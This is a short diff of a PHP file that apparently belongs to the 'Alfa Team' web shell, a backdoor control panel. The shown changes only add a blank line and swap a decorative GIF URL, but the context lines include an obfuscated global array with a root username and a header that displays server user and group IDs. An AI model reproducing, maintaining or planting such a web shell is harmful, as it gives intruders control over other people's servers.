@@ -1,4 +1,5 @@
 
+
 <?php
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'root',
@@ -1103,7 +1104,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="170" alt="alfa team 2012" draggable="false" src="https://i.gifer.com/31Kl.gif" /></td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="170" alt="alfa team 2012" draggable="false" src="https://i.gifer.com/Mhhf.gif" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
